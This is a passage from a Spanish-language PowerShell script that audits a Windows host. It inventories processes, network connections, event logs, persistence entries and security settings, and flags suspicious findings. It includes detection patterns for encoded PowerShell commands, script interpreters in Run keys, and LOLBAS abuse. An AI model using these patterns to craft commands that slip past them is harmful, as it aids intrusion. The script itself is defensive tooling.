                    catch { $sigCache[$p] = 'UnknownError' }
                }
                return $sigCache[$p] -eq 'Valid'
            }}
        
        $outputPath = Join-Path $Global:AuditPath "03_Procesos\procesos_activos"
        Export-MultiFormat -Data $processes -BasePath $outputPath -Title "Procesos en Ejecucion"
        
        # Detectar procesos sin ruta (altamente sospechoso)
        # Se excluyen procesos protegidos del sistema cuyo Path no es accesible
        # ni siquiera con privilegios de administrador (falsos positivos).
        $protectedProcessNames = @(
            'Idle', 'System', 'Registry', 'Memory Compression', 'Secure System',
            'csrss', 'lsass', 'smss', 'wininit', 'winlogon', 'services', 'svchost',
            'fontdrvhost', 'dwm', 'sihost', 'taskhostw', 'ctfmon', 'conhost',
            'spoolsv', 'WUDFHost', 'audiodg', 'LsaIso', 'MsMpEng', 'NisSrv',
            'MpDefenderCoreService', 'SecurityHealthService', 'SecurityHealthSystray'
        )
        # Sin elevacion, Path es null para procesos de otras sesiones y la comprobacion
        # generaria falsos positivos masivos; solo tiene sentido con privilegios de admin.
        $processesNoPath = @()
        if (Test-Administrator) {
            $processesNoPath = $allProcesses | Where-Object { 
                $null -eq $_.Path -and $_.Name -notin $protectedProcessNames
            }
        } else {
            Write-AuditLog "  -> Comprobacion de procesos sin ruta omitida (requiere elevacion)" -Level WARNING
            $Global:WarningsCount++
            Add-CoverageGap -Check "Procesos sin ruta" -Reason "requiere elevacion"
        }
        
        if ($processesNoPath) {
            $outputPath = Join-Path $Global:AuditPath "03_Procesos\procesos_sin_ruta"
            Export-MultiFormat -Data $processesNoPath -BasePath $outputPath -Title "[!] Procesos sin Ruta (SOSPECHOSO)"
            
            $processesNoPath | ForEach-Object {
                Add-ThreatDetection -ThreatType "Proceso sin ruta" -Severity "HIGH" `
                    -Description "Proceso '$($_.Name)' (PID: $($_.Id)) ejecutandose sin ruta de archivo" -Details $_
            }
        }
        
        # Procesos con linea de comandos (detectar comandos sospechosos)
        $processesWithCmdLine = Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine,
            @{Name="CreationDate"; Expression={$_.ConvertToDateTime($_.CreationDate)}}
        
        $outputPath = Join-Path $Global:AuditPath "03_Procesos\procesos_con_comandos"
        Export-MultiFormat -Data $processesWithCmdLine -BasePath $outputPath -Title "Procesos con Linea de Comandos"
        
        # Detectar comandos codificados y patrones maliciosos
        $processesWithCmdLine | ForEach-Object {
            # Omitir el propio proceso de auditoria (autodeteccion)
            if ($_.ProcessId -eq $PID) { return }
            if ($_.CommandLine) {
                $cmdLine = $_.CommandLine.ToLower()
                
                # Detectar comando codificado en Base64 (solo con contexto de PowerShell).
                if ($cmdLine -match $Global:EncodedCommandPattern) {
                    Add-ThreatDetection -ThreatType "Comando codificado" -Severity "CRITICAL" `
                        -Description "Proceso '$($_.Name)' (PID: $($_.ProcessId)) invoca PowerShell con comando codificado" -Details $_
                }
                
                # Detectar patrones maliciosos (uno por proceso, para no duplicar severidad)
                foreach ($pattern in $Global:MaliciousPatterns) {
                    if ($cmdLine -match $pattern.ToLower()) {
                        Add-ThreatDetection -ThreatType "Patron malicioso detectado" -Severity "HIGH" `
                            -Description "Proceso '$($_.Name)' (PID: $($_.ProcessId)) contiene patron malicioso en su linea de comandos" -Details $_
                        break
                    }
                }
            }
        }
        
        # Servicios del sistema
        # Una sola consulta CIM para todas las rutas de binario (antes ~300 consultas
        # WMI individuales, una por servicio).
        $serviceBinaries = @{}
        foreach ($svc in Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue) {
            $serviceBinaries[$svc.Name] = $svc.PathName
        }
        $services = Get-Service | Select-Object Name, DisplayName, Status, StartType,
            @{Name="BinaryPath"; Expression={ $serviceBinaries[$_.Name] }}
        
        $outputPath = Join-Path $Global:AuditPath "03_Procesos\servicios"
        Export-MultiFormat -Data $services -BasePath $outputPath -Title "Servicios del Sistema"
        
        # Servicios automaticos en ejecucion
        $autoServices = $services | Where-Object { $_.StartType -eq "Automatic" -and $_.Status -eq "Running" }
        $outputPath = Join-Path $Global:AuditPath "03_Procesos\servicios_automaticos"
        Export-MultiFormat -Data $autoServices -BasePath $outputPath -Title "Servicios Automaticos en Ejecucion"
        
        Write-AuditLog "  -> Total procesos: $($processes.Count)" -Level INFO
        Write-AuditLog "  -> Total servicios: $($services.Count)" -Level INFO
        Write-AuditLog "[OK] Analisis de procesos y servicios completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de procesos: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 4: Analisis de Red y Conexiones
.DESCRIPTION
    Analiza conexiones de red activas, puertos abiertos y configuracion de red
#>
function Get-NetworkAnalysis {
    Update-ModuleProgress -ModuleName "Red y Conexiones"
    Write-AuditLog "Analizando red y conexiones activas..." -Level INFO
    
    try {
        # Mapa PID -> proceso: evita un Get-Process por cada conexion (400+ llamadas).
        $procById = @{}
        foreach ($p in Get-Process) { $procById[$p.Id] = $p }

        # Conexiones TCP activas con informacion de proceso
        $tcpConnections = Get-NetTCPConnection | ForEach-Object {
            # OwningProcess viene como UInt32; las claves del mapa son Int32. Sin el
            # cast la busqueda no encuentra el proceso y ProcessName queda null.
            $proc = $procById[[int]$_.OwningProcess]
            
            [PSCustomObject]@{
                LocalAddress = $_.LocalAddress
                LocalPort = $_.LocalPort
                RemoteAddress = $_.RemoteAddress
                RemotePort = $_.RemotePort
                State = $_.State
                PID = $_.OwningProcess
                ProcessName = $proc.Name
                ProcessPath = $proc.Path
                Company = $proc.Company
            }
        }
        
        $outputPath = Join-Path $Global:AuditPath "04_Red\conexiones_tcp"
        Export-MultiFormat -Data $tcpConnections -BasePath $outputPath -Title "Conexiones TCP Activas"
        
        # Conexiones establecidas (trafico activo)
        $establishedConnections = $tcpConnections | Where-Object { $_.State -eq "Established" }
        $outputPath = Join-Path $Global:AuditPath "04_Red\conexiones_establecidas"
        Export-MultiFormat -Data $establishedConnections -BasePath $outputPath -Title "Conexiones Establecidas"
        
        # Detectar conexiones a puertos sospechosos
        $establishedConnections | ForEach-Object {
            if ($_.RemotePort -in $Global:SuspiciousPorts -and -not (Test-PrivateOrLoopbackAddress $_.RemoteAddress)) {
                Add-ThreatDetection -ThreatType "Conexion a puerto sospechoso" -Severity "HIGH" `
                    -Description "Proceso '$($_.ProcessName)' conectado a puerto sospechoso $($_.RemotePort) en $($_.RemoteAddress)" -Details $_
            }
            
            # Detectar conexiones externas de procesos del sistema.
            # Un svchost/lsass legitimo siempre esta en C:\Windows\System32; solo se
            # senala si la ruta del binario es legible y NO esta ahi (secuestro de proceso).
            # Sin elevacion la ruta no es legible y no se puede verificar, por lo que no se senala.
            if ($_.ProcessName -in @('svchost', 'lsass', 'csrss', 'smss', 'wininit') -and 
                $_.RemoteAddress -notmatch "^(127\.0\.0\.1|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)") {
                $procPath = "$($_.ProcessPath)".ToLower()
                if ($procPath -and $procPath -notlike 'c:\windows\system32\*') {
                    Add-ThreatDetection -ThreatType "Proceso del sistema con conexion externa" -Severity "CRITICAL" `
                        -Description "Proceso '$($_.ProcessName)' (ruta: $($_.ProcessPath)) conectado a IP externa $($_.RemoteAddress)" -Details $_
                }
            }
        }
        
        # Puertos sospechosos en escucha: un puerto de C2 escuchando en 0.0.0.0 es
        # superficie de ataque aunque no haya ninguna conexion establecida.
        $listeningSuspicious = $tcpConnections | Where-Object {
            $_.State -eq "Listen" -and
            $_.LocalPort -in $Global:SuspiciousPorts -and
            $_.LocalAddress -notin @("127.0.0.1", "::1")
        }
        foreach ($lp in $listeningSuspicious) {
            Add-ThreatDetection -ThreatType "Puerto sospechoso en escucha" -Severity "MEDIUM" `
                -Description "Puerto $($lp.LocalPort) en escucha en $($lp.LocalAddress) (proceso '$($lp.ProcessName)')" -Details $lp
        }

        # Puertos en escucha (superficie de ataque)
        $listeningPorts = $tcpConnections | Where-Object { $_.State -eq "Listen" }
        $outputPath = Join-Path $Global:AuditPath "04_Red\puertos_escucha"
        Export-MultiFormat -Data $listeningPorts -BasePath $outputPath -Title "Puertos en Escucha"
        
        # Endpoints UDP
        $udpEndpoints = Get-NetUDPEndpoint | ForEach-Object {
            $proc = $procById[[int]$_.OwningProcess]
            
            [PSCustomObject]@{
                LocalAddress = $_.LocalAddress
                LocalPort = $_.LocalPort
                PID = $_.OwningProcess
                ProcessName = $proc.Name
            }
        }
        
        $outputPath = Join-Path $Global:AuditPath "04_Red\udp_endpoints"
        Export-MultiFormat -Data $udpEndpoints -BasePath $outputPath -Title "Endpoints UDP"
        
        # Cache DNS (dominios resueltos recientemente)
        $dnsCache = Get-DnsClientCache -ErrorAction SilentlyContinue | 
            Select-Object Entry, Name, Data, TimeToLive, Type
        
        if ($dnsCache) {
            $outputPath = Join-Path $Global:AuditPath "04_Red\dns_cache"
            Export-MultiFormat -Data $dnsCache -BasePath $outputPath -Title "Cache DNS"
        }
        
        # Configuracion de adaptadores de red
        $networkAdapters = Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, 
            MacAddress, LinkSpeed, MediaType
        
        $outputPath = Join-Path $Global:AuditPath "04_Red\adaptadores_red"
        Export-MultiFormat -Data $networkAdapters -BasePath $outputPath -Title "Adaptadores de Red"
        
        Write-AuditLog "  -> Conexiones TCP: $($tcpConnections.Count)" -Level INFO
        Write-AuditLog "  -> Conexiones establecidas: $($establishedConnections.Count)" -Level INFO
        Write-AuditLog "  -> Puertos en escucha: $($listeningPorts.Count)" -Level INFO
        Write-AuditLog "[OK] Analisis de red completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de red: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 5: Analisis de Logs y Eventos de Seguridad
.DESCRIPTION
    Analiza eventos criticos del sistema, logins fallidos y eventos de PowerShell
#>
function Get-SecurityEvents {
    Update-ModuleProgress -ModuleName "Logs y Eventos de Seguridad"
    Write-AuditLog "Analizando eventos de seguridad..." -Level INFO
    
    try {
        # Verificar si se ejecuta como administrador (necesario para leer Security log)
        if (-not (Test-Administrator)) {
            Write-AuditLog "[!] Ejecutando sin privilegios de administrador - Eventos de seguridad limitados" -Level WARNING
            $Global:WarningsCount++
            Add-CoverageGap -Check "Logins fallidos (4625) y bloqueos (4740)" -Reason "requiere elevacion"
        }
        
        # Eventos de logins fallidos (Event ID 4625)
        try {
            $failedLogins = Get-WinEvent -FilterHashtable @{
                LogName='Security'; 
                ID=4625
            } -MaxEvents 100 -ErrorAction SilentlyContinue | ForEach-Object {
                [PSCustomObject]@{
                    TimeCreated = $_.TimeCreated
                    Username = $_.Properties[5].Value
                    Domain = $_.Properties[6].Value
                    SourceIP = $_.Properties[19].Value
                    FailureReason = $_.Properties[8].Value
                    SourceComputer = $_.Properties[13].Value
                }
            }
            
            if ($failedLogins) {
                $outputPath = Join-Path $Global:AuditPath "05_Eventos\logins_fallidos"
                Export-MultiFormat -Data $failedLogins -BasePath $outputPath -Title "Intentos de Login Fallidos (Event ID 4625)"
                
                # Detectar posibles ataques de fuerza bruta
                $failedLoginsByUser = $failedLogins | Group-Object Username | Where-Object { $_.Count -ge 5 }
                if ($failedLoginsByUser) {
                    $failedLoginsByUser | ForEach-Object {
                        Add-ThreatDetection -ThreatType "Posible ataque de fuerza bruta" -Severity "HIGH" `
                            -Description "Usuario '$($_.Name)' tiene $($_.Count) intentos fallidos de login" -Details $_
                    }
                }
                
                Write-AuditLog "  -> Logins fallidos: $($failedLogins.Count)" -Level INFO
            }
        } catch {
            Write-AuditLog "No se pudieron leer eventos de logins fallidos (requiere privilegios de admin)" -Level WARNING
            $Global:WarningsCount++
        }
        
        # Eventos de bloqueo de cuenta (Event ID 4740)
        try {
            $accountLockouts = Get-WinEvent -FilterHashtable @{
                LogName='Security'; 
                ID=4740
            } -MaxEvents 50 -ErrorAction SilentlyContinue | ForEach-Object {
                [PSCustomObject]@{
                    TimeCreated = $_.TimeCreated
                    LockedAccount = $_.Properties[0].Value
                    CallerComputer = $_.Properties[1].Value
                }
            }
            
            if ($accountLockouts) {
                $outputPath = Join-Path $Global:AuditPath "05_Eventos\cuentas_bloqueadas"
                Export-MultiFormat -Data $accountLockouts -BasePath $outputPath -Title "Bloqueos de Cuenta (Event ID 4740)"
                
                Write-AuditLog "  -> Cuentas bloqueadas: $($accountLockouts.Count)" -Level INFO
            }
        } catch {
            Write-Verbose "No hay eventos de bloqueo de cuenta recientes"
        }
        
        # Eventos de PowerShell (ScriptBlock Logging - Event ID 4104)
        try {
            $psEvents = Get-WinEvent -FilterHashtable @{
                LogName='Microsoft-Windows-PowerShell/Operational';
                ID=4104
            } -MaxEvents 200 -ErrorAction SilentlyContinue | Select-Object TimeCreated, Id, ProcessId,
                @{Name="ScriptBlock"; Expression={$_.Properties[2].Value}},
                @{Name="ScriptPath"; Expression={$_.Properties[4].Value}}
            
            if ($psEvents) {
                $outputPath = Join-Path $Global:AuditPath "05_Eventos\powershell_scriptblock"
                Export-MultiFormat -Data $psEvents -BasePath $outputPath -Title "PowerShell ScriptBlock Logging"
                
                # Detectar comandos codificados o patrones maliciosos
                $psEvents | ForEach-Object {
                    # Omitir eventos generados por la propia auditoria (autodeteccion)
                    if ($_.ProcessId -eq $PID -or
                        ($_.ScriptPath -and $_.ScriptPath -eq $Global:ScriptPath) -or
                        ($_.ScriptBlock -and $_.ScriptBlock -match [regex]::Escape($Global:ScriptPath))) {
                        return
                    }
                    $scriptBlock = if ($_.ScriptBlock) { $_.ScriptBlock.ToLower() } else { "" }
                    
                    # El scriptblock ya es codigo PowerShell: aqui si tiene sentido el
                    # patron generic de -enc/-e sin contexto de interprete.
                    if ($scriptBlock -match ('-(e|en|enco|enc|encod|enc' + 'oded)(com' + 'mand)?\b')) {
                        Add-ThreatDetection -ThreatType "PowerShell comando codificado" -Severity "HIGH" `
                            -Description "Comando PowerShell codificado detectado" -Details $_
                    }
                    
                    foreach ($pattern in $Global:MaliciousPatterns) {
                        if ($scriptBlock -match $pattern.ToLower()) {
                            Add-ThreatDetection -ThreatType "PowerShell patron malicioso" -Severity "HIGH" `
                                -Description "Patron malicioso '$pattern' detectado en PowerShell" -Details $_
                            break
                        }
                    }
                }
                
                Write-AuditLog "  -> Eventos PowerShell: $($psEvents.Count)" -Level INFO
            }
        } catch {
            Write-Verbose "No se pudieron leer eventos de PowerShell"
        }
        
        # Eventos de aplicacion (errores y warnings)
        try {
            $appEvents = Get-WinEvent -FilterHashtable @{
                LogName='Application';
                Level=1,2,3  # Critical, Error, Warning
            } -MaxEvents 100 -ErrorAction SilentlyContinue | Select-Object TimeCreated, Level, 
                ProviderName, Id, Message
            
            if ($appEvents) {
                $outputPath = Join-Path $Global:AuditPath "05_Eventos\eventos_aplicacion"
                Export-MultiFormat -Data $appEvents -BasePath $outputPath -Title "Eventos de Aplicacion (Criticos/Errores)"
            }
        } catch {
            Write-Verbose "No se pudieron leer eventos de aplicacion"
        }
        
        # Eventos del sistema (errores y warnings)
        try {
            $systemEvents = Get-WinEvent -FilterHashtable @{
                LogName='System';
                Level=1,2,3
            } -MaxEvents 100 -ErrorAction SilentlyContinue | Select-Object TimeCreated, Level, 
                ProviderName, Id, Message
            
            if ($systemEvents) {
                $outputPath = Join-Path $Global:AuditPath "05_Eventos\eventos_sistema"
                Export-MultiFormat -Data $systemEvents -BasePath $outputPath -Title "Eventos del Sistema (Criticos/Errores)"
            }
        } catch {
            Write-Verbose "No se pudieron leer eventos del sistema"
        }
        
        Write-AuditLog "[OK] Analisis de eventos de seguridad completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de eventos: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 6: Analisis de Archivos y Persistencia
.DESCRIPTION
    Analiza archivos modificados recientemente, registro de persistencia y archivos sospechosos
#>
function Get-FilesAndPersistence {
    Update-ModuleProgress -ModuleName "Archivos y Persistencia"
    Write-AuditLog "Analizando archivos y mecanismos de persistencia..." -Level INFO
    
    try {
        # Archivos modificados en las ultimas 24 horas en directorios criticos
        $criticalPaths = @(
            "C:\Windows\System32",
            "C:\Windows\Temp",
            "C:\ProgramData",
            "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )
        
        $recentFiles = @()
        foreach ($path in $criticalPaths) {
            if (Test-Path $path) {
                $files = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue |
                    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } |
                    Select-Object FullName, LastWriteTime, Length, Attributes,
                        @{Name="SizeMB"; Expression={[math]::Round($_.Length/1MB, 2)}}
                
                $recentFiles += $files
            }
        }
        
        if ($recentFiles) {
            $outputPath = Join-Path $Global:AuditPath "06_Archivos\archivos_modificados_24h"
            Export-MultiFormat -Data $recentFiles -BasePath $outputPath -Title "Archivos Modificados (Ultimas 24 Horas)"
            
            Write-AuditLog "  -> Archivos modificados: $($recentFiles.Count)" -Level INFO
        }
        
        # Archivos ocultos en directorios de usuario
        # Recursion acotada: exclusiones de carpetas pesadas, anti-ciclo de enlaces y tiempo maximo,
        # porque Get-ChildItem -Recurse sobre C:\Users puede tardar horas en Windows PowerShell 5.1
        $suspiciousExts = $Global:SuspiciousExtensions -replace '\*', ''
        $hiddenFiles = @()
        $scanQueue = New-Object System.Collections.Generic.Queue[string]
        [void]$scanQueue.Enqueue('C:\Users')
        $visitedDirs = New-Object System.Collections.Generic.HashSet[string]
        [void]$visitedDirs.Add('C:\Users')
        $excludeFolderNames = @(
            'node_modules', '.git', '__pycache__', '$recycle.bin',
            'venv', '.venv', '.npm', '.nuget', '.cargo', '.rustup',
            '.gradle', '.m2', '.local', '.cache'
        )
        $scanTimeout = [TimeSpan]::FromSeconds(180)
        $scanStart = Get-Date
        while ($scanQueue.Count -gt 0) {
            if ((Get-Date) - $scanStart -gt $scanTimeout) {
                Write-AuditLog "  -> Escaneo de ocultos detenido por tiempo maximo (180s); resultados parciales" -Level INFO
                break
            }
            $dir = $scanQueue.Dequeue()
            $items = Get-ChildItem -LiteralPath $dir -Force -ErrorAction SilentlyContinue
            foreach ($item in $items) {
                if ($item.PSIsContainer) {
                    $norm = $item.FullName.TrimEnd('\')
                    if (-not $visitedDirs.Contains($norm)) {
                        [void]$visitedDirs.Add($norm)
                        if ($excludeFolderNames -notcontains $item.Name.ToLower()) {
                            [void]$scanQueue.Enqueue($norm)
                        }
                    }
                } else {
                    if (($item.Attributes -band [System.IO.FileAttributes]::Hidden) -and ($item.Extension -in $suspiciousExts)) {
                        $hiddenFiles += ,[PSCustomObject]@{
                            FullName = $item.FullName
                            Attributes = $item.Attributes
                            Length = $item.Length
                            CreationTime = $item.CreationTime
                            LastWriteTime = $item.LastWriteTime
                        }
                    }
                }
            }
        }
        
        if ($hiddenFiles) {
            $outputPath = Join-Path $Global:AuditPath "06_Archivos\archivos_ocultos_sospechosos"
            Export-MultiFormat -Data $hiddenFiles -BasePath $outputPath -Title "Archivos Ocultos Sospechosos"
            
            $hiddenFiles | ForEach-Object {
                Add-ThreatDetection -ThreatType "Archivo ejecutable oculto" -Severity "MEDIUM" `
                    -Description "Archivo oculto encontrado: $($_.FullName)" -Details $_
            }
        }
        
        # Analisis de persistencia en registro - Run Keys
        $runKeysPaths = @(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
        )
        
        $runKeys = @()
        foreach ($path in $runKeysPaths) {
            if (Test-Path $path) {
                $keys = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
                if ($keys) {
                    $keys.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                        $runKeys += [PSCustomObject]@{
                            RegistryPath = $path
                            Name = $_.Name
                            Command = $_.Value
                        }
                    }
                }
            }
        }
        
        if ($runKeys) {
            $outputPath = Join-Path $Global:AuditPath "06_Archivos\persistencia_run_keys"
            Export-MultiFormat -Data $runKeys -BasePath $outputPath -Title "Persistencia en Run Keys del Registro"
            
            Write-AuditLog "  -> Entradas de Run Keys: $($runKeys.Count)" -Level INFO
            
            # Detectar comandos sospechosos en Run Keys
            $runKeys | ForEach-Object {
                $command = $_.Command.ToLower()
                
                if ($command -match "temp|appdata.*local.*temp|programdata") {
                    Add-ThreatDetection -ThreatType "Run Key sospechoso" -Severity "HIGH" `
                        -Description "Run Key ejecuta desde ubicacion temporal: $($_.Command)" -Details $_
                }
                
                if ($command -match "powershell|cmd|wscript|cscript") {
                    Add-ThreatDetection -ThreatType "Run Key con script" -Severity "MEDIUM" `
                        -Description "Run Key ejecuta script: $($_.Command)" -Details $_
                }
            }
        }
        
        # Tareas programadas (otra forma comun de persistencia)
        $scheduledTasks = Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } |
            Select-Object TaskName, TaskPath, State, 
                @{Name="Actions"; Expression={($_.Actions | ForEach-Object { $_.Execute + " " + $_.Arguments }) -join "; "}}
        
        $outputPath = Join-Path $Global:AuditPath "06_Archivos\tareas_programadas"
        Export-MultiFormat -Data $scheduledTasks -BasePath $outputPath -Title "Tareas Programadas Activas"
        
        # Verificar integridad del archivo HOSTS
        $hostsFile = "C:\Windows\System32\drivers\etc\hosts"
        if (Test-Path $hostsFile) {
            $hostsContent = Get-Content $hostsFile
            $hostsHash = (Get-FileHash $hostsFile -Algorithm SHA256).Hash
            
            $hostsInfo = [PSCustomObject]@{
                FilePath = $hostsFile
                SHA256 = $hostsHash
                LastModified = (Get-Item $hostsFile).LastWriteTime
                LineCount = $hostsContent.Count
                Content = $hostsContent -join "`n"
            }
            
            $outputPath = Join-Path $Global:AuditPath "06_Archivos\archivo_hosts"
            Export-MultiFormat -Data $hostsInfo -BasePath $outputPath -Title "Archivo HOSTS del Sistema"
            
            # Detectar entradas sospechosas en HOSTS
            # Se omiten secciones gestionadas por herramientas (Tailscale MagicDNS),
            # que reescriben el archivo de forma legitima.
            $inManagedSection = $false
            $hostsContent | ForEach-Object {
                if ($_ -match "TailscaleHostsSectionStart") { $inManagedSection = $true; return }
                if ($_ -match "TailscaleHostsSectionEnd") { $inManagedSection = $false; return }
                if ($inManagedSection) { return }
                if ($_ -notmatch "^#" -and $_ -match "^\s*\d+\.\d+\.\d+\.\d+" -and $_ -notmatch "127\.0\.0\.1.*localhost") {
                    Add-ThreatDetection -ThreatType "Entrada sospechosa en HOSTS" -Severity "HIGH" `
                        -Description "Redireccion en archivo HOSTS: $_" -Details $_
                }
            }
        }
        
        Write-AuditLog "[OK] Analisis de archivos y persistencia completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de archivos: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 7: Configuraciones de Seguridad
.DESCRIPTION
    Analiza politicas de seguridad, firewall, antivirus y configuraciones del sistema
#>
function Get-SecurityConfiguration {
    Update-ModuleProgress -ModuleName "Configuraciones de Seguridad"
    Write-AuditLog "Analizando configuraciones de seguridad..." -Level INFO
    
    try {
        # Politica de ejecucion de PowerShell
        $executionPolicy = Get-ExecutionPolicy -List | Select-Object Scope, ExecutionPolicy
        $outputPath = Join-Path $Global:AuditPath "07_Configuracion\powershell_execution_policy"
        Export-MultiFormat -Data $executionPolicy -BasePath $outputPath -Title "Politica de Ejecucion de PowerShell"
        
        # Perfiles de firewall
        $firewallProfiles = Get-NetFirewallProfile | Select-Object Name, Enabled, 
            DefaultInboundAction, DefaultOutboundAction, LogAllowed, LogBlocked, LogFileName
        
        $outputPath = Join-Path $Global:AuditPath "07_Configuracion\firewall_perfiles"
        Export-MultiFormat -Data $firewallProfiles -BasePath $outputPath -Title "Perfiles del Firewall de Windows"
        
        # Detectar firewall deshabilitado
        $firewallProfiles | ForEach-Object {
            if (-not $_.Enabled) {
                Add-ThreatDetection -ThreatType "Firewall deshabilitado" -Severity "HIGH" `
                    -Description "Perfil de firewall '$($_.Name)' esta deshabilitado" -Details $_
            }
        }
        
        # Reglas de firewall habilitadas
        $firewallRules = Get-NetFirewallRule | Where-Object { $_.Enabled -eq $true } |
            Select-Object DisplayName, Direction, Action, Profile, 
                @{Name="LocalPort"; Expression={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).LocalPort}},
                @{Name="RemotePort"; Expression={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).RemotePort}},
                @{Name="Protocol"; Expression={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).Protocol}}
        
        $outputPath = Join-Path $Global:AuditPath "07_Configuracion\firewall_reglas"
        Export-MultiFormat -Data $firewallRules -BasePath $outputPath -Title "Reglas del Firewall Habilitadas"
        
        # Windows Defender (si esta disponible)
        try {
            $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
            
            if ($defenderStatus) {
                $defenderInfo = [PSCustomObject]@{
                    AntivirusEnabled = $defenderStatus.AntivirusEnabled
                    RealTimeProtectionEnabled = $defenderStatus.RealTimeProtectionEnabled
                    BehaviorMonitorEnabled = $defenderStatus.BehaviorMonitorEnabled
                    IoavProtectionEnabled = $defenderStatus.IoavProtectionEnabled
                    OnAccessProtectionEnabled = $defenderStatus.OnAccessProtectionEnabled
                    AntivirusSignatureLastUpdated = $defenderStatus.AntivirusSignatureLastUpdated
                    QuickScanAge = $defenderStatus.QuickScanAge
                    FullScanAge = $defenderStatus.FullScanAge
                }
                
                $outputPath = Join-Path $Global:AuditPath "07_Configuracion\windows_defender"
                Export-MultiFormat -Data $defenderInfo -BasePath $outputPath -Title "Estado de Windows Defender"
                
                # Detectar Defender deshabilitado
                if (-not $defenderStatus.AntivirusEnabled) {
                    Add-ThreatDetection -ThreatType "Windows Defender deshabilitado" -Severity "CRITICAL" `
                        -Description "Windows Defender esta deshabilitado" -Details $defenderInfo
                }
                
                if (-not $defenderStatus.RealTimeProtectionEnabled) {
                    Add-ThreatDetection -ThreatType "Proteccion en tiempo real deshabilitada" -Severity "HIGH" `
                        -Description "La proteccion en tiempo real de Defender esta deshabilitada" -Details $defenderInfo
                }
                
                # Verificar actualizacion de firmas
                if ($defenderStatus.AntivirusSignatureLastUpdated -lt (Get-Date).AddDays(-7)) {
                    Add-ThreatDetection -ThreatType "Firmas de antivirus desactualizadas" -Severity "MEDIUM" `
                        -Description "Las firmas de antivirus tienen mas de 7 dias de antigedad" -Details $defenderInfo
                }
            }
        } catch {
            Write-Verbose "Windows Defender no esta disponible o no se pudo consultar"
        }
        
        # Recursos compartidos de red
        $networkShares = Get-SmbShare | Select-Object Name, Path, Description, 
            CurrentUsers, EncryptData, 
            @{Name="Permissions"; Expression={
                (Get-SmbShareAccess -Name $_.Name | ForEach-Object { "$($_.AccountName):$($_.AccessRight)" }) -join "; "
            }}
        
        $outputPath = Join-Path $Global:AuditPath "07_Configuracion\recursos_compartidos"
        Export-MultiFormat -Data $networkShares -BasePath $outputPath -Title "Recursos Compartidos de Red"
        
        # Detectar recursos compartidos peligrosos
        $networkShares | ForEach-Object {
            # C$, D$, ... son acciones administrativas predeterminadas de Windows en todos
            # los equipos; solo senalar nombres no estandar con terminacion $.
            if ($_.Name -notmatch '^[A-Z]\$' -and $_.Name -ne 'ADMIN$' -and $_.Name -ne 'IPC$' -and $_.Name -match '\$') {
                Add-ThreatDetection -ThreatType "Recurso compartido de disco" -Severity "MEDIUM" `
                    -Description "Disco compartido detectado: $($_.Name)" -Details $_
            }
            
            if ($_.Permissions -match "Everyone:Full") {
                Add-ThreatDetection -ThreatType "Recurso compartido sin restricciones" -Severity "HIGH" `
                    -Description "Recurso '$($_.Name)' permite acceso completo a Everyone" -Details $_
            }
        }
        
        # Configuracion de UAC (User Account Control)
        $uacSettings = @{
            "EnableLUA" = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA
            "ConsentPromptBehaviorAdmin" = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").ConsentPromptBehaviorAdmin
            "PromptOnSecureDesktop" = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").PromptOnSecureDesktop
        }
        
        $uacInfo = [PSCustomObject]$uacSettings
        $outputPath = Join-Path $Global:AuditPath "07_Configuracion\uac_configuracion"
        Export-MultiFormat -Data $uacInfo -BasePath $outputPath -Title "Configuracion de UAC"
        
        if ($uacSettings.EnableLUA -eq 0) {
            Add-ThreatDetection -ThreatType "UAC deshabilitado" -Severity "HIGH" `
                -Description "User Account Control esta completamente deshabilitado" -Details $uacInfo
        }
        
        Write-AuditLog "[OK] Analisis de configuraciones de seguridad completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de configuracion: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 8: Deteccion de Binarios LOLBAS
.DESCRIPTION
    Detecta el uso de binarios legitimos de Windows para propositos maliciosos
#>
function Get-LOLBASDetection {
    Update-ModuleProgress -ModuleName "Deteccion de LOLBAS"
    Write-AuditLog "Analizando uso de binarios LOLBAS..." -Level INFO
    
    try {
        # Buscar procesos LOLBAS actualmente en ejecucion
        # Lineas de comando de todos los procesos en una sola consulta CIM.
        $cmdByPid = @{}
